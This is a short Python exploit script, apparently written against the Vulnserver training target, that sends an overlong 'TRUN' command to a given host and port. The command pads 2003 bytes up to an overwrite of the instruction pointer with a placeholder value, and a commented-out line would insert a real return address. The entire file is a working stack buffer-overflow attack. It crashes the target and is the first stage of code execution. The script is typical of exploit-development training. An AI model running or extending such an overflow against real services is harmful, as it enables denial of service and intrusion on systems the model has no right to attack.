#!/usr/bin/env python3

import socket
import argparse
import struct



parser = argparse.ArgumentParser()
parser.add_argument(
	"host",
	type=str,
	help="the hostname or IP address to connect to",
)
parser.add_argument(
	"port",
	type=int,
	help="the port for the service to connect to",
)

args = parser.parse_args()

#offset number determined from fuzzing and ms-
offset = 2003
#struct.pack changes the memory address (0x080491f6) into little endian format (\xf6\x91\x04\x08)
#new_eip=struct.pack("<I", 0x080491f6)
new_eip=b"BBBB"
payload =b"".join([
	b"TRUN /.:/",
	b"A" * offset,
	new_eip,
	b"\n",
	
])


with socket.socket() as connection:

	connection.connect((args.host, args.port))
	#b/c recv requires one fuction, put 4096 bytes into the field
	print(connection.recv(4096).decode("utf-8"))
	connection.send(payload)
	print(connection.recv(4096).decode("utf-8"))
	

